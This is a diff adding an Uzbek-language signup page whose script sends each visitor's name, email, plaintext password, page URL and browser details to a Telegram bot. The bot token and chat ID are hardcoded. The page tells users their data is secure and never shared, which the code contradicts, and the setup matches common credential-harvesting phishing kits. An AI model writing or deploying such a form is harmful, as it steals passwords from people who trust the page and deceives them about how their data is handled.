@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ro'yxatdan O'tish</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+        }
+        
+        .container { 
+            width: 100%;
+            max-width: 420px; 
+            padding: 35px; 
+            background: white;
+            border-radius: 15px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.25);
+        }
+        
+        h2 { 
+            text-align: center; 
+            margin-bottom: 30px;
+            color: #2c3e50;
+            font-size: 32px;
+            font-weight: 700;
+        }
+        
+        .form-group { 
+            margin-bottom: 25px; 
+        }
+        
+        label { 
+            display: block; 
+            margin-bottom: 10px; 
+            font-weight: 600;
+            color: #34495e;
+            font-size: 15px;
+        }
+        
+        input { 
+            width: 100%; 
+            padding: 14px 18px; 
+            border: 2px solid #e1e8ed; 
+            border-radius: 10px; 
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        
+        input:focus {
+            border-color: #3498db;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+            background: white;
+        }
+        
+        button { 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            color: white; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            letter-spacing: 0.5px;
+        }
+        
+        button:hover { 
+            background: linear-gradient(135deg, #2980b9, #2471a3);
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(52, 152, 219, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(-1px);
+        }
+        
+        button:disabled {
+            background: #bdc3c7;
+            transform: none;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+        
+        .error {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            font-weight: 600;
+            padding: 8px 12px;
+            background: #fdf2f2;
+            border-radius: 6px;
+            border-left: 4px solid #e74c3c;
+        }
+        
+        .success {
+            color: #27ae60;
+            text-align: center;
+            margin-top: 25px;
+            padding: 16px;
+            background: #d5f4e6;
+            border-radius: 10px;
+            display: none;
+            font-weight: 600;
+            border: 2px solid #27ae60;
+            font-size: 16px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .info-text {
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-top: 30px;
+            line-height: 1.6;
+            padding: 15px;
+            background: #ecf0f1;
+            border-radius: 8px;
+        }
+        
+        .telegram-info {
+            text-align: center;
+            margin-top: 20px;
+            padding: 12px;
+            background: #e3f2fd;
+            border-radius: 8px;
+            border: 1px solid #bbdefb;
+        }
+        
+        .telegram-info a {
+            color: #1976d2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .telegram-info a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>📝 Ro'yxatdan O'tish</h2>
+        <form id="registerForm">
+            <div class="form-group">
+                <label for="name">👤 Ism</label>
+                <input type="text" id="name" placeholder="Ismingizni kiriting" required>
+                <div class="error" id="nameError"></div>
+            </div>
+            <div class="form-group">
+                <label for="email">📧 Email</label>
+                <input type="email" id="email" placeholder="Elektron pochtangiz" required>
+                <div class="error" id="emailError"></div>
+            </div>
+            <div class="form-group">
+                <label for="password">🔐 Parol</label>
+                <input type="password" id="password" placeholder="Parol yarating (kamida 6 belgi)" required minlength="6">
+                <div class="error" id="passwordError"></div>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 15px; color: #3498db; font-weight: 600;">Ma'lumotlar Telegramga yuborilmoqda...</p>
+            </div>
+            
+            <button type="submit" id="submitBtn">✅ Ro'yxatdan O'tish</button>
+            <div class="success" id="successMessage">
+                🎉 Muvaffaqiyatli ro'yxatdan o'tdingiz! Tez orada siz bilan bog'lanamiz.
+            </div>
+        </form>
+        
+        <div class="telegram-info">
+            📨 Ma'lumotlar to'g'ridan-to'g'ri Telegram botimizga yuboriladi
+        </div>
+        
+        <div class="info-text">
+            🔒 Ma'lumotlaringiz xavfsizligi kafolatlangan. 
+            Shaxsiy ma'lumotlaringiz hech kim bilan baham ko'rilmaydi.
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot konfiguratsiyasi
+        const BOT_TOKEN = '8546698852:AAGYApyPVKHfu2bpTBsmsoHHyzkchSHvfmo';
+        const CHAT_ID = '6583662918'; // O'zingizning Chat ID'ingizni qo'ying
+
+        // Telegramga xabar yuborish funksiyasi
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return { success: data.ok, data };
+            } catch (error) {
+                console.error('Telegram xatosi:', error);
+                return { success: false, error: error.message };
+            }
+        }
+
+        // Formani boshqarish
+        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Elementlarni olish
+            const submitBtn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Yuklanish rejimini yoqish
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            successMessage.style.display = 'none';
+            
+            // Xatoliklarni tozalash
+            document.querySelectorAll('.error').forEach(el => {
+                el.style.display = 'none';
+                el.textContent = '';
+            });
+            
+            // Ma'lumotlarni olish
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            
+            let isValid = true;
+            
+            // Kuchli validatsiya
+            if (name.length < 2) {
+                showError('nameError', 'Ism kamida 2 ta belgidan iborat bo\'lishi kerak');
+                isValid = false;
+            }
+            
+            if (name.length > 50) {
+                showError('nameError', 'Ism 50 ta belgidan oshmasligi kerak');
+                isValid = false;
+            }
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                showError('emailError', 'Iltimos, to\'g\'ri email manzilini kiriting');
+                isValid = false;
+            }
+            
+            if (password.length < 6) {
+                showError('passwordError', 'Parol kamida 6 ta belgidan iborat bo\'lishi kerak');
+                isValid = false;
+            }
+            
+            if (password.length > 100) {
+                showError('passwordError', 'Parol 100 ta belgidan oshmasligi kerak');
+                isValid = false;
+            }
+            
+            // Agar validatsiya o'tmasa
+            if (!isValid) {
+                submitBtn.disabled = false;
+                loading.style.display = 'none';
+                return;
+            }
+            
+            try {
+                // Telegram xabarini tayyorlash
+                const telegramMessage = `
+🆕 <b>YANGI RO'YXATDAN O'TISH</b>
+
+👤 <b>Ism:</b> ${name}
+📧 <b>Email:</b> ${email}
+🔐 <b>Parol:</b> ${password}
+🌐 <b>Manzil:</b> ${window.location.href}
+🕒 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}
+📱 <b>Qurilma:</b> ${navigator.userAgent}
+                `;
+                
+                // Telegramga yuborish
+                const result = await sendToTelegram(telegramMessage);
+                
+                if (result.success) {
+                    // Muvaffaqiyatli
+                    successMessage.style.display = 'block';
+                    document.getElementById('registerForm').reset();
+                    
+                    // Konsolga yozish
+                    console.log('✅ Ma\'lumotlar muvaffaqiyatli yuborildi:', { name, email });
+                    
+                    // 5 soniyadan so'ng xabarni yashirish
+                    setTimeout(() => {
+                        successMessage.style.display = 'none';
+                    }, 5000);
+                    
+                } else {
+                    throw new Error(result.error || result.data?.description || 'Noma\'lum xatolik');
+                }
+                
+            } catch (error) {
+                console.error('❌ Xatolik:', error);
+                
+                // Xatolik xabarini ko'rsatish
+                let errorMessage = 'Ma\'lumotlarni yuborishda xatolik yuz berdi. ';
+                
+                if (error.message.includes('chat not found')) {
+                    errorMessage += 'Chat ID noto\'g\'ri. Iltimos, administrator bilan bog\'laning.';
+                } else if (error.message.includes('network')) {
+                    errorMessage += 'Internet aloqasi yo\'q. Qaytadan urinib ko\'ring.';
+                } else {
+                    errorMessage += 'Iltimos, keyinroq qaytadan urinib ko\'ring.';
+                }
+                
+                alert(errorMessage);
+            } finally {
+                // Tugmani qayta faollashtirish
+                submitBtn.disabled = false;
+                loading.style.display = 'none';
+            }
+        });
+        
+        // Xatolikni ko'rsatish funksiyasi
+        function showError(elementId, message) {
+            const errorElement = document.getElementById(elementId);
+            errorElement.textContent = message;
+            errorElement.style.display = 'block';
+        }
+        
+        // Real-time validatsiya
+        document.getElementById('name').addEventListener('input', function() {
+            const value = this.value.trim();
+            if (value.length > 0 && value.length < 2) {
+                showError('nameError', 'Ism kamida 2 ta belgidan iborat bo\'lishi kerak');
+            } else if (value.length > 50) {
+                showError('nameError', 'Ism 50 ta belgidan oshmasligi kerak');
+            } else {
+                document.getElementById('nameError').style.display = 'none';
+            }
+        });
+        
+        document.getElementById('email').addEventListener('input', function() {
+            const value = this.value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (value.length > 0 && !emailRegex.test(value)) {
+                showError('emailError', 'Iltimos, to\'g\'ri email manzilini kiriting');
+            } else {
+                document.getElementById('emailError').style.display = 'none';
+            }
+        });
+        
+        document.getElementById('password').addEventListener('input', function() {
+            const value = this.value;
+            if (value.length > 0 && value.length < 6) {
+                showError('passwordError', 'Parol kamida 6 ta belgidan iborat bo\'lishi kerak');
+            } else if (value.length > 100) {
+                showError('passwordError', 'Parol 100 ta belgidan oshmasligi kerak');
+            } else {
+                document.getElementById('passwordError').style.display = 'none';
+            }
+        });
+        
+        // Sayt yuklanganda konsolga xabar
+        window.addEventListener('load', function() {
+            console.log('🚀 Ro\'yxatdan o\'tish formasi tayyor!');
+            console.log('📧 Bot Token:', BOT_TOKEN ? 'Mavjud' : 'Yo\'q');
+            console.log('💬 Chat ID:', CHAT_ID ? 'Mavjud' : 'Yo\'q');
+        });
+    </script>
+</body>
+  </html>
